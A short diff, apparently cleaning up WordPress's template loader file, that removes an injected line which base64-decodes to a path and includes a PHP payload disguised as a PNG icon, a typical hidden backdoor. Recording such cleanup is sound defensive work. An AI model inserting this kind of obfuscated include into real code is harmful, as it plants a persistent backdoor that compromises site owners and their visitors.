@@ -1,4 +1,4 @@
-<?php @include base64_decode("L3Zhci93d3cvdXNlcjY5NDQ4L2RhdGEvd3d3L3RleHRpbGUtZXhwZXJ0LnJ1L3dwLWluY2x1ZGVzL2ltYWdlcy93cGljb25zLTN4LnBuZw==");?><?php
+<?php
 /**
  * Loads the correct template based on the visitor's url
  *
